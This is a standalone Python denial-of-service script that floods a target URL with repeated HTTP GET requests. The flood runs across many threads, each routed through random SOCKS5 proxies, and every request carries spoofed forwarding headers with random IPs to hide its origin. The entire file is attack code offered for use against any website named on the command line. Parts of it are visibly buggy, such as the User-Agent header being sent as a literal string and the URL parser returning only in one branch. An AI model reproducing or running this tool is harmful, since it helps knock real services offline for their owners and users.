
# xD ~Aya

import socket, socks, ssl, time, random
from threading import Thread
from sys import argv
from urllib import parse

def UAlist():
        return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "bbos",
        "urmom",
        "xd",
        "null"
        ]

def urlparser(url):
	parser = {}
	parser['path'] = parse.urlparse(url).path
	if parser['path'] == '':
		parser['path'] = '/'
	parser['host'] = parse.urlparse(url).netloc
	parser['scheme'] = parse.urlparse(url).scheme
	if ':' in parse.urlparse(url).netloc:
		parser['port'] = parse.urlparse(url).netloc.split(":")[1]
	else:
		parser['port'] = '443' if parse.urlparse(url).scheme == 'https' else '80'
		return parser

def spoofer():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)
	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)
	return spoof_ip


def attack(url, timer):
    timeout = time.time() + int(timer)
    proxies = open("utils/socks5.txt").readlines()
    proxy = random.choice(proxies).strip().split(":")
    req =  "GET "+urlparser(url)['path']+" HTTP/1.1\r\nHost: " + urlparser(url)['host'] + "\r\n"
    req += "User-Agent: random.choice(UAlist())" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparser(url)['host']+", 1.1.1.1\r\n"
    req += "Via: "+random.choice(spoofer())+"\r\n"
    req += "Client-IP: "+random.choice(spoofer())+"\r\n"
    req += "X-Forwarded-For: "+random.choice(spoofer())+"\r\n"
    req += "Real-IP: "+random.choice(spoofer())+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparser(url)['host']), urlparser(url)['port']))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparser(url)['host'])
            try:
                for i in range(300):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def launch(url, timer, threads):
    try:
        for _ in range(int(threads)):
            Thread(target=attack, args=(url, timer)).start()
    except:
        pass


launch(str(argv[1]), argv[2], argv[3])
